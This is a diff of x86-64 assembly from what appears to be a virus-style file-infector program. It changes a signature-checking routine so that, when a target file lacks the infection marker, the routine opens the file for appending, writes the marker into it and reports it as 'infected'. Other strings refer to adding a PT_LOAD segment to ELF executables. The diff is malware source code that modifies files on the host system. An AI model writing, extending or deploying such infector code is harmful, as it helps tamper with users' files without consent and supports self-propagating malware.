@@ -18,12 +18,12 @@ section .bss
     sig_check_buf:  resb BUFFER_SIZE          ; buffer for checking signature
 
 section .data
-    newline:          db 10               ; newline character
-    msg_valid:        db " is a valid elf64 executable", 10, 0
-    msg_invalid:      db " is not a valid elf64 executable", 10, 0
-    msg_add_pt_load:  db "add pt_load", 10, 0
-    msg_infected:     db "infected file", 10, 0
-    msg_not_infected: db "not infected", 10, 0
+    newline:              db 10               ; newline character
+    msg_valid:            db " is a valid elf64 executable", 10, 0
+    msg_invalid:          db " is not a valid elf64 executable", 10, 0
+    msg_add_pt_load:      db "add pt_load", 10, 0
+    msg_infected:         db "infected ", 0
+    msg_already_infected: db "already infected", 10, 0
 
 section .text
 global _start
@@ -266,12 +266,13 @@ add_pt_load:
     ret
 
 ; ============================================
-; check_signature(char *filepath)
+; process_non_elf_file(char *filepath)
 ; rdi = pointer to file path
 ; Opens the file, searches for the signature string,
-; prints "infected file" if found, else "not infected"
+; if found: prints "already infected"
+; if not found: appends signature and prints "infected " + filename
 ; ============================================
-check_signature:
+process_non_elf_file:
     push rbp
     mov rbp, rsp
     push r12                    ; saved file path
@@ -292,7 +293,7 @@ check_signature:
 
     ; Check if open failed
     test rax, rax
-    js .check_sig_not_infected  ; if fd < 0, treat as not infected
+    js .process_done            ; if fd < 0, just return
 
     mov r13, rax                ; r13 = fd
 
@@ -304,7 +305,7 @@ check_signature:
     syscall
 
     test rax, rax
-    jle .check_sig_close_not_infected  ; if size <= 0 or lseek failed, not infected
+    jle .process_close_and_append  ; if size <= 0, treat as not infected
 
     mov r14, rax                ; r14 = file size
 
@@ -317,7 +318,7 @@ check_signature:
 
     xor r15, r15                ; r15 = current position in file
 
-.check_sig_read_loop:
+.process_sig_read_loop:
     ; Read a chunk of the file
     mov eax, SYS_READ
     mov edi, r13d               ; fd
@@ -327,7 +328,7 @@ check_signature:
 
     ; Check if read failed or EOF
     test rax, rax
-    jle .check_sig_close_not_infected  ; if bytes_read <= 0, not found
+    jle .process_close_and_append  ; if bytes_read <= 0, not found
 
     mov rbx, rax                ; rbx = bytes_read
 
@@ -338,15 +339,15 @@ check_signature:
     mov rcx, signature_len        ; signature length
     call search_substring
 
-    ; If found (rax == 1), file is infected
+    ; If found (rax == 1), file is already infected
     test rax, rax
-    jnz .check_sig_close_infected
+    jnz .process_already_infected
 
     ; Calculate overlap for next read (in case signature spans chunks)
     ; Seek back by (signature_len - 1) bytes to handle boundary cases
     add r15, rbx                ; update position
     cmp r15, r14                ; check if we've read the whole file
-    jge .check_sig_close_not_infected
+    jge .process_close_and_append
 
     ; Seek back slightly to handle signatures that span chunk boundaries
     ; Calculate new position: max(0, r15 - signature_len + 1)
@@ -356,7 +357,7 @@ check_signature:
     
     ; Check for negative offset (shouldn't happen but be safe)
     test rsi, rsi
-    js .check_sig_close_not_infected
+    js .process_close_and_append
     
     mov eax, SYS_LSEEK
     mov edi, r13d               ; fd
@@ -365,34 +366,67 @@ check_signature:
 
     ; Check if lseek failed
     test rax, rax
-    js .check_sig_close_not_infected
+    js .process_close_and_append
 
     mov r15, rax                ; update position to new seek position
-    jmp .check_sig_read_loop
+    jmp .process_sig_read_loop
 
-.check_sig_close_infected:
+.process_already_infected:
     ; Close the file
     mov eax, SYS_CLOSE
     mov edi, r13d
     syscall
 
-    ; Print "infected file"
+    ; Print "already infected"
+    lea rdi, [rel msg_already_infected]
+    call print_string
+    jmp .process_done
+
+.process_close_and_append:
+    ; Close the file
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+
+    ; Reopen file for appending (O_WRONLY | O_APPEND)
+    mov eax, SYS_OPENAT
+    mov edi, AT_FDCWD
+    mov rsi, r12                ; pathname
+    mov edx, O_WRONLY | O_APPEND  ; flags: write + append
+    xor r10d, r10d
+    syscall
+
+    ; Check if open failed
+    test rax, rax
+    js .process_done            ; if fd < 0, just return
+
+    mov r13, rax                ; r13 = fd
+
+    ; Write the signature to the file
+    mov eax, SYS_WRITE
+    mov edi, r13d               ; fd
+    lea rsi, [rel signature]    ; signature string
+    mov edx, signature_len      ; length of signature
+    syscall
+
+    ; Close the file
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+
+    ; Print "infected " + filename + newline
     lea rdi, [rel msg_infected]
     call print_string
-    jmp .check_sig_done
-
-.check_sig_close_not_infected:
-    ; Close the file
-    mov eax, SYS_CLOSE
-    mov edi, r13d
+    mov rdi, r12                ; filename
+    call print_string
+    ; Print newline
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel newline]
+    mov edx, 1
     syscall
 
-.check_sig_not_infected:
-    ; Print "not infected"
-    lea rdi, [rel msg_not_infected]
-    call print_string
-
-.check_sig_done:
+.process_done:
     pop rbx
     pop r15
     pop r14
